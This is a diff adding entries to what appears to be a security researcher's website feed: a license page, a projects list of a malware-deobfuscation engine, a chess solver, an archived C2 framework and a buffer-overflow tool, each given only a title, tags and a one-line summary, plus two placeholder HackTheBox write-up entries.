+  &lt;li&gt;&lt;strong&gt;License grant.&lt;/strong&gt; Subject to the terms and conditions of this Public License, the Licensor hereby grants You a worldwide, royalty-free, non-sublicensable, non-exclusive, irrevocable license to exercise the Licensed Rights in the Licensed Material to:
+    &lt;ul&gt;
+      &lt;li&gt;reproduce and Share the Licensed Material, in whole or in part; and&lt;/li&gt;
+      &lt;li&gt;produce and reproduce, but not Share, Adapted Material.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Exceptions and Limitations.&lt;/strong&gt; For the avoidance of doubt, where Exceptions and Limitations apply to Your use, this Public License does not apply.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Term.&lt;/strong&gt; The term of this Public License is specified in Section 6(a).&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Media and formats; technical modifications allowed.&lt;/strong&gt; The Licensor authorizes You to exercise the Licensed Rights in all media and formats whether now known or hereafter created, and to make technical modifications necessary to do so.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;No endorsement.&lt;/strong&gt; Nothing in this Public License constitutes or may be construed as permission to assert or imply that You are, or that Your use of the Licensed Material is, connected with, or sponsored, endorsed, or granted official status by, the Licensor.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;section-3--license-conditions&quot;&gt;Section 3 – License Conditions.&lt;/h2&gt;
+
+&lt;p&gt;Your exercise of the Licensed Rights is expressly made subject to the following conditions.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;Attribution.&lt;/strong&gt;
+    &lt;ul&gt;
+      &lt;li&gt;If You Share the Licensed Material, You must retain identification of the creator(s) and any others designated to receive attribution (tralsesec), a copyright notice, a notice that refers to this Public License, and a URI or hyperlink to the Licensed Material.&lt;/li&gt;
+      &lt;li&gt;You may satisfy these conditions in any reasonable manner based on the medium and context.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;NoDerivatives.&lt;/strong&gt; For the avoidance of doubt, You do not have permission under this Public License to Share Adapted Material.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;section-4--sui-generis-database-rights&quot;&gt;Section 4 – Sui Generis Database Rights.&lt;/h2&gt;
+
+&lt;p&gt;(Applicable where Sui Generis Database Rights apply to Your use of the Licensed Material.)&lt;/p&gt;
+
+&lt;h2 id=&quot;section-5--disclaimer-of-warranties-and-limitation-of-liability&quot;&gt;Section 5 – Disclaimer of Warranties and Limitation of Liability.&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;Unless otherwise separately undertaken by the Licensor, the Licensor offers the Licensed Material as-is and as-available, and makes no representations or warranties of any kind.&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;In no event will the Licensor be liable to You on any legal theory for any direct, special, indirect, incidental, consequential, punitive, exemplary, or other losses.&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;section-6--term-and-termination&quot;&gt;Section 6 – Term and Termination.&lt;/h2&gt;
+
+&lt;p&gt;a. This Public License applies for the term of the Copyright and Similar Rights licensed here. However, if You fail to comply with this Public License, then Your rights under this Public License terminate automatically.&lt;/p&gt;
+
+&lt;h2 id=&quot;section-7--other-terms-and-conditions&quot;&gt;Section 7 – Other Terms and Conditions.&lt;/h2&gt;
+
+&lt;p&gt;a. The Licensor shall not be bound by any additional or different terms or conditions communicated by You unless expressly agreed.&lt;/p&gt;
+
+&lt;h2 id=&quot;section-8--interpretation&quot;&gt;Section 8 – Interpretation.&lt;/h2&gt;
+
+&lt;p&gt;a. For the avoidance of doubt, this Public License does not reduce, limit, restrict, or impose conditions on any use of the Licensed Material that could lawfully be made without permission.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;Copyright (c) 2025-2026. @tralsesec. All rights reserved.&lt;/p&gt;
+</content>
+  </entry>
+  
+  <entry>
+    <title>Projects</title>
+    
+    <link href="http://localhost:4000/projects/"/>
+    <updated>2026-05-14T06:04:45+02:00</updated>
+    <id>http://localhost:4000/projects/</id>
+
+    
+    
+      <category term="Dossier" label="Project" />
+    
+    
+    <content type="html">&lt;h1 class=&quot;text-green&quot;&gt;// PROJECTS&lt;/h1&gt;
+&lt;p class=&quot;fg-dim&quot; style=&quot;margin-bottom: 3rem;&quot;&gt;
+Tactical development logs and architectural research. These records document the transition from automated exploitation to custom engine design.
+&lt;/p&gt;
+
+&lt;div class=&quot;projects-grid&quot;&gt;
+
+
+&lt;div class=&quot;project-card&quot; style=&quot;border: 1px solid var(--border); padding: 1.5rem; margin-bottom: 2.5rem; background: #0a0a0a;&quot;&gt;
+  
+  &lt;div style=&quot;display: flex; justify-content: space-between; align-items: flex-start; gap: 1rem; margin-bottom: 1rem;&quot;&gt;
+    &lt;h2 style=&quot;margin: 0; line-height: 1.2;&quot;&gt;
+      &lt;a href=&quot;/projects/revenant/&quot; style=&quot;color: var(--accent); border: none;&quot;&gt;Revenant – The Lucid Execution Engine&lt;/a&gt;
+    &lt;/h2&gt;
+    
+    &lt;div style=&quot;font-family: var(--font-mono); font-size: 0.65rem; white-space: nowrap; margin-top: 4px;&quot;&gt;
+      &lt;span style=&quot;color: var(--accent); border: 1px solid var(--accent); padding: 2px 8px;&quot;&gt;
+        [ACTIVE]
+      &lt;/span&gt;
+    &lt;/div&gt;
+  &lt;/div&gt;
+
+  &lt;div style=&quot;display: flex; flex-wrap: wrap; gap: 1.5rem; font-family: var(--font-mono); font-size: 0.7rem; margin-bottom: 1.5rem; opacity: 0.6;&quot;&gt;
+    &lt;span&gt;&lt;span class=&quot;fg-dim&quot;&gt;TIMELINE:&lt;/span&gt; Dec 2025 – Present&lt;/span&gt;
+    &lt;span&gt;&lt;span class=&quot;fg-dim&quot;&gt;LANG:&lt;/span&gt; Rust / LLVM&lt;/span&gt;
+  &lt;/div&gt;
+
+  &lt;div style=&quot;font-size: 0.9rem; line-height: 1.6; margin-bottom: 1.5rem;&quot;&gt;
+    Executive Summary Revenant is a high-performance Dynamic Binary Translation (DBT) framework engineered in Rust. It specializes in the automated deobfuscation of polymorphic and metamorphic malware by lifting opaque binary blobs...
+  &lt;/div&gt;
+
+  &lt;div style=&quot;display: flex; flex-wrap: wrap; gap: 8px;&quot;&gt;
+    
+    &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+      Rust
+    &lt;/span&gt;
+    
+    &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+      LLVM
+    &lt;/span&gt;
+    
+    &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+      Compiler Internals
+    &lt;/span&gt;
+    
+    &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+      DBT
+    &lt;/span&gt;
+    
+    &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+      AArch64
+    &lt;/span&gt;
+    
+    &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+      x86_64
+    &lt;/span&gt;
+    
+  &lt;/div&gt;
+
+  &lt;div style=&quot;margin-top: 1.5rem; border-top: 1px solid #222; padding-top: 1rem; display: flex; flex-wrap: wrap; gap: 1rem; justify-content: space-between; align-items: center;&quot;&gt;
+    
+    &lt;a href=&quot;/projects/revenant/&quot; class=&quot;text-green&quot; style=&quot;font-size: 0.8rem; font-family: var(--font-mono); border: none; white-space: nowrap;&quot;&gt;
+      ACCESS_FULL_DOSSIER_AND_LOGS -&amp;gt;
+    &lt;/a&gt;
+
+    
+    &lt;a href=&quot;https://github.com/Revenant-Engine&quot; target=&quot;_blank&quot; style=&quot;font-family: var(--font-mono); font-size: 0.75rem; color: var(--fg-dim); border: none; display: flex; align-items: center; gap: 5px; white-space: nowrap;&quot;&gt;
+      &lt;svg height=&quot;14&quot; width=&quot;14&quot; viewBox=&quot;0 0 16 16&quot; fill=&quot;currentColor&quot; style=&quot;opacity: 0.8;&quot;&gt;&lt;path d=&quot;M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;
+      SOURCE_CODE
+    &lt;/a&gt;
+    
+  &lt;/div&gt;
+  
+&lt;/div&gt;
+
+&lt;div class=&quot;project-card&quot; style=&quot;border: 1px solid var(--border); padding: 1.5rem; margin-bottom: 2.5rem; background: #0a0a0a;&quot;&gt;
+  
+  &lt;div style=&quot;display: flex; justify-content: space-between; align-items: flex-start; gap: 1rem; margin-bottom: 1rem;&quot;&gt;
+    &lt;h2 style=&quot;margin: 0; line-height: 1.2;&quot;&gt;
+      &lt;a href=&quot;/projects/xernoth/&quot; style=&quot;color: var(--accent); border: none;&quot;&gt;Xernoth – Deterministic State-Space Chess Solver&lt;/a&gt;
+    &lt;/h2&gt;
+    
+    &lt;div style=&quot;font-family: var(--font-mono); font-size: 0.65rem; white-space: nowrap; margin-top: 4px;&quot;&gt;
+      &lt;span style=&quot;color: var(--accent); border: 1px solid var(--accent); padding: 2px 8px;&quot;&gt;
+        [ACTIVE]
+      &lt;/span&gt;
+    &lt;/div&gt;
+  &lt;/div&gt;
+
+  &lt;div style=&quot;display: flex; flex-wrap: wrap; gap: 1.5rem; font-family: var(--font-mono); font-size: 0.7rem; margin-bottom: 1.5rem; opacity: 0.6;&quot;&gt;
+    &lt;span&gt;&lt;span class=&quot;fg-dim&quot;&gt;TIMELINE:&lt;/span&gt; Apr 2025 – Present&lt;/span&gt;
+    &lt;span&gt;&lt;span class=&quot;fg-dim&quot;&gt;LANG:&lt;/span&gt; Zig&lt;/span&gt;
+  &lt;/div&gt;
+
+  &lt;div style=&quot;font-size: 0.9rem; line-height: 1.6; margin-bottom: 1.5rem;&quot;&gt;
+    Developing a high-performance, deterministic solver engine in Zig, challenging standard heuristic approaches (like Alpha-Beta pruning) via novel state-space reduction.
+
+  &lt;/div&gt;
+
+  &lt;div style=&quot;display: flex; flex-wrap: wrap; gap: 8px;&quot;&gt;
+    
+    &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+      Zig
+    &lt;/span&gt;
+    
+    &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+      SIMD
+    &lt;/span&gt;
+    
+    &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+      State-Space Reduction
+    &lt;/span&gt;
+    
+    &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+      Retrograde Analysis
+    &lt;/span&gt;
+    
+    &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+      Bitboards
+    &lt;/span&gt;
+    
+  &lt;/div&gt;
+
+  &lt;div style=&quot;margin-top: 1.5rem; border-top: 1px solid #222; padding-top: 1rem; display: flex; flex-wrap: wrap; gap: 1rem; justify-content: space-between; align-items: center;&quot;&gt;
+    
+    &lt;a href=&quot;/projects/xernoth/&quot; class=&quot;text-green&quot; style=&quot;font-size: 0.8rem; font-family: var(--font-mono); border: none; white-space: nowrap;&quot;&gt;
+      ACCESS_FULL_DOSSIER_AND_LOGS -&amp;gt;
+    &lt;/a&gt;
+
+    
+  &lt;/div&gt;
+  
+&lt;/div&gt;
+
+&lt;div class=&quot;project-card&quot; style=&quot;border: 1px solid var(--border); padding: 1.5rem; margin-bottom: 2.5rem; background: #0a0a0a;&quot;&gt;
+  
+  &lt;div style=&quot;display: flex; justify-content: space-between; align-items: flex-start; gap: 1rem; margin-bottom: 1rem;&quot;&gt;
+    &lt;h2 style=&quot;margin: 0; line-height: 1.2;&quot;&gt;
+      &lt;a href=&quot;/projects/atp-c2/&quot; style=&quot;color: var(--accent); border: none;&quot;&gt;ATP C2 – Custom Command &amp;amp; Control Infrastructure&lt;/a&gt;
+    &lt;/h2&gt;
+    
+    &lt;div style=&quot;font-family: var(--font-mono); font-size: 0.65rem; white-space: nowrap; margin-top: 4px;&quot;&gt;
+      &lt;span style=&quot;color: #888; border: 1px solid #444; padding: 2px 8px;&quot;&gt;
+        [ARCHIVED]
+      &lt;/span&gt;
+    &lt;/div&gt;
+  &lt;/div&gt;
+
+  &lt;div style=&quot;display: flex; flex-wrap: wrap; gap: 1.5rem; font-family: var(--font-mono); font-size: 0.7rem; margin-bottom: 1.5rem; opacity: 0.6;&quot;&gt;
+    &lt;span&gt;&lt;span class=&quot;fg-dim&quot;&gt;TIMELINE:&lt;/span&gt; Aug 2023 – Dec 2023&lt;/span&gt;
+    &lt;span&gt;&lt;span class=&quot;fg-dim&quot;&gt;LANG:&lt;/span&gt; C++, ASM, PowerShell&lt;/span&gt;
+  &lt;/div&gt;
+
+  &lt;div style=&quot;font-size: 0.9rem; line-height: 1.6; margin-bottom: 1.5rem;&quot;&gt;
+    Designed and implemented a custom Command &amp;amp; Control (C2) infrastructure to simulate sophisticated adversary behavior in controlled environments.
+
+  &lt;/div&gt;
+
+  &lt;div style=&quot;display: flex; flex-wrap: wrap; gap: 8px;&quot;&gt;
+    
+    &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+      C++
+    &lt;/span&gt;
+    
+    &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+      C2
+    &lt;/span&gt;
+    
+    &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+      Malware Dev
+    &lt;/span&gt;
+    
+    &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+      EDR Evasion
+    &lt;/span&gt;
+    
+    &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+      Windows Internals
+    &lt;/span&gt;
+    
+  &lt;/div&gt;
+
+  &lt;div style=&quot;margin-top: 1.5rem; border-top: 1px solid #222; padding-top: 1rem; display: flex; flex-wrap: wrap; gap: 1rem; justify-content: space-between; align-items: center;&quot;&gt;
+    
+    &lt;a href=&quot;/projects/atp-c2/&quot; class=&quot;text-green&quot; style=&quot;font-size: 0.8rem; font-family: var(--font-mono); border: none; white-space: nowrap;&quot;&gt;
+      ACCESS_FULL_DOSSIER_AND_LOGS -&amp;gt;
+    &lt;/a&gt;
+
+    
+  &lt;/div&gt;
+  
+&lt;/div&gt;
+
+&lt;div class=&quot;project-card&quot; style=&quot;border: 1px solid var(--border); padding: 1.5rem; margin-bottom: 2.5rem; background: #0a0a0a;&quot;&gt;
+  
+  &lt;div style=&quot;display: flex; justify-content: space-between; align-items: flex-start; gap: 1rem; margin-bottom: 1rem;&quot;&gt;
+    &lt;h2 style=&quot;margin: 0; line-height: 1.2;&quot;&gt;
+      &lt;a href=&quot;/projects/baf/&quot; style=&quot;color: var(--accent); border: none;&quot;&gt;BAF – Buffer Overflow Automation Framework&lt;/a&gt;
+    &lt;/h2&gt;
+    
+    &lt;div style=&quot;font-family: var(--font-mono); font-size: 0.65rem; white-space: nowrap; margin-top: 4px;&quot;&gt;
+      &lt;span style=&quot;color: #888; border: 1px solid #444; padding: 2px 8px;&quot;&gt;
+        [ARCHIVED]
+      &lt;/span&gt;
+    &lt;/div&gt;
+  &lt;/div&gt;
+
+  &lt;div style=&quot;display: flex; flex-wrap: wrap; gap: 1.5rem; font-family: var(--font-mono); font-size: 0.7rem; margin-bottom: 1.5rem; opacity: 0.6;&quot;&gt;
+    &lt;span&gt;&lt;span class=&quot;fg-dim&quot;&gt;TIMELINE:&lt;/span&gt; Jan 2023 – March 2023&lt;/span&gt;
+    &lt;span&gt;&lt;span class=&quot;fg-dim&quot;&gt;LANG:&lt;/span&gt; Python&lt;/span&gt;
+  &lt;/div&gt;
+
+  &lt;div style=&quot;font-size: 0.9rem; line-height: 1.6; margin-bottom: 1.5rem;&quot;&gt;
+    A custom exploitation tool written in Python to automate the detection and exploitation of x86 stack-based buffer overflows. This framework was developed at age 15, establishing my foundation in low-level...
+  &lt;/div&gt;
+
+  &lt;div style=&quot;display: flex; flex-wrap: wrap; gap: 8px;&quot;&gt;
+    
+    &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+      Python
+    &lt;/span&gt;
+    
+    &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+      x86
+    &lt;/span&gt;
+    
+    &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+      ROP Chains
+    &lt;/span&gt;
+    
+    &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+      WinDbg
+    &lt;/span&gt;
+    
+    &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+      Fuzzing
+    &lt;/span&gt;
+    
+  &lt;/div&gt;
+
+  &lt;div style=&quot;margin-top: 1.5rem; border-top: 1px solid #222; padding-top: 1rem; display: flex; flex-wrap: wrap; gap: 1rem; justify-content: space-between; align-items: center;&quot;&gt;
+    
+    &lt;a href=&quot;/projects/baf/&quot; class=&quot;text-green&quot; style=&quot;font-size: 0.8rem; font-family: var(--font-mono); border: none; white-space: nowrap;&quot;&gt;
+      ACCESS_FULL_DOSSIER_AND_LOGS -&amp;gt;
+    &lt;/a&gt;
+
+    
+    &lt;a href=&quot;https://github.com/tralsesec/BAF&quot; target=&quot;_blank&quot; style=&quot;font-family: var(--font-mono); font-size: 0.75rem; color: var(--fg-dim); border: none; display: flex; align-items: center; gap: 5px; white-space: nowrap;&quot;&gt;
+      &lt;svg height=&quot;14&quot; width=&quot;14&quot; viewBox=&quot;0 0 16 16&quot; fill=&quot;currentColor&quot; style=&quot;opacity: 0.8;&quot;&gt;&lt;path d=&quot;M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;
+      SOURCE_CODE
+    &lt;/a&gt;
+    
+  &lt;/div&gt;
+  
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;style&gt;
+hr {
+    border: none !important;
+    height: 1px !important;
+    background-color: #222 !important; 
+    margin: 3rem 0 !important;
+    box-shadow: none !important;
+    outline: none !important;
+}
+&lt;/style&gt;
+
+</content>
+  </entry>
+  
+  <entry>
+    <title>HackTheBox: Redelegate</title>
+    
+    <link href="http://localhost:4000/ctfs/htb-redelegate/"/>
+    <updated>2026-05-14T00:00:00+02:00</updated>
+    <id>http://localhost:4000/ctfs/htb-redelegate/</id>
+
+    
+    
+      <category term="Mission Log" label="CTF" />
+    
+    
+    <content type="html">&lt;p&gt;Coming soon.&lt;/p&gt;
+</content>
+  </entry>
+  
+  <entry>
+    <title>HackTheBox: Craft</title>
+    
+    <link href="http://localhost:4000/ctfs/htb-craft/"/>
+    <updated>2026-05-14T00:00:00+02:00</updated>
+    <id>http://localhost:4000/ctfs/htb-craft/</id>
+
+    
+    
+      <category term="Mission Log" label="CTF" />
+    
+    
+    <content type="html">&lt;p&gt;Coming soon.&lt;/p&gt;
+
 </content>
   </entry>
   
